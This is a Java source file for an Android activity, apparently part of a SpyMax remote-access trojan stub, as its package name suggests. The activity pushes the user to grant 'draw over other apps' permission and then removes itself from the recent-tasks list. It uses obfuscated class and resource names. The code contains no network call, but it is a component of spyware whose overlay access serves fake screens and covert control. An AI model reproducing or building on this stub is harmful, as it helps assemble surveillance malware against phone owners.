package spymax.stub7;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class _ask_draw_ extends Activity {
    @Override
    public void onCreate(Bundle v) {


        super.onCreate(v);
        try
        {
//            requestWindowFeature(Window.FEATURE_NO_TITLE);
//            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
//                    WindowManager.LayoutParams.FLAG_FULLSCREEN);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (!Settings.canDrawOverlays(this)) {
                        Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();

                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 0);

                    }
                    else {
                        finish();







                    }
                }
                //ClassGen11.showToast("Enable Accessibility For : "+getString(R.string.f1f2f3f4f5f6));



        }catch (Exception e ){}


       // finish();

    }


//    @Override
//    protected void onResume() {
//        super.onResume();
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            if (!Settings.canDrawOverlays(this)) {
//                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
//                startActivityForResult(intent, 0);
//                Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();
//
//            }
//        }
//        else
//        {
//            finish();
//        }
//    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 0) {
            if(resultCode == Activity.RESULT_OK){

                //String result=data.getStringExtra("result");
                finish();
            }else{
                if (resultCode == Activity.RESULT_CANCELED) {
                    finish();
                    // Write your code if there's no result
//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//
//
//                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
//                        startActivityForResult(intent, 0);
//                        Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();
//
//
//                    }
//                    else
//                    {
//                        finish();
//                    }
                }
            }


        }

    }



    // public boolean isback = false;

//    @Override
//    public boolean onKeyDown(int keyCode, KeyEvent event) {
//        isback =true;
//        _engine_wrk_.shown =false;
//        finish();
//        return super.onKeyDown(keyCode, event);
//    }

    @Override
    public void finish() {
        ClassGen3.shown =false;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }

}

